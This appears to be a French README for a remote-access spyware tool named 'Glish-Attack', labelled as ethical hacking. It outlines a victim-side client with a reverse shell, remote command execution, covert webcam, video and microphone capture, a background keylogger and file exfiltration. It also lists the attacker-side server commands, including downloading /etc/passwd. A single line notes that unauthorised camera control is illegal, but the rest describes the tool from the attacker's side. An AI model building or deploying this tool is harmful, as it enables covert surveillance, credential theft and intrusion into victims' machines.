# Glish-Attack (HACKING ETHIQUE)

## Rmq:Prendre le contrôle de la caméra sans autorisation est illégal 

#### Voici le plan du script client (victime) qu’on va créer :
🔁 Fonctions de base
* Connexion reverse shell
* Exécution de commandes shell

- 🎥 Surveillance
- 📸 Capture webcam (photo)
- 🎬 Capture vidéo (10 sec)
- 🎙️ Enregistrement audio (10 sec via micro)
- ⌨️ Espionnage
- ⌨️ Keylogger en fond
- 💾 Exfiltration de fichiers
- 📁 Navigation et lecture de fichiers

#### On va utiliser :

```bash
pip install opencv-python sounddevice scipy pynput
```
* Webcam	`cv2` (OpenCV)
* Microphone	`sounddevice, scipy.io.wavfile`
* Keylogger	`pynput`
* Transfert fichier	`base64, open()`


#### 🔐 Fonctionnalités incluses :
Fonction	Commande côté serveur

* 📸 Webcam (photo)	>> webcam_snap
* 🎥 Vidéo (10s)	>> video_capture
* 🎙️ Audio (10s)	>> record_audio
* ⌨️ Keylogger	>> get_keys
* 📂 Télécharger fichier >> 	download /chemin/fichier
* 📁 Changer de dossier >> 	cd chemin
* ❌ Fermer la connexion >>	exit

#### 🚀 Utilisation côté attaquant (serveur)
1. Lance le serveur :

```bash
python3 server.py
```
2. Attends la connexion du client

Une fois connecté, tape des commandes :

```ruby
>> webcam_snap
>> video_capture
>> record_audio
>> get_keys
>> download /etc/passwd
>> cd /home/user
>> exit
```
